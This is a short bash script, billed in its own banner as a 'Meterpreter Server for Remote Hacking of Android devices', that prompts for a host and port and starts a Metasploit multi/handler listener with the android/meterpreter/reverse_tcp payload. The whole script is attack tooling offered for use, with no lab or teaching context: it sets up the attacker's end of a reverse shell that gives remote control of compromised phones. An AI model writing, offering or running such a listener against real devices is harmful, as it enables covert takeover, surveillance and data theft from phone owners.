#!/bin/bash

clear
echo -e "\033[0;34m$(figlet "Meterpreter Server")\033[0m"
echo "                                                            "
echo "[+] Meterpreter Server for Remote Hacking of Android devices"
echo "                                                            "
read -p "[+] set LHOST: " lhost
read -p "[+] set LPORT: " lport

msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
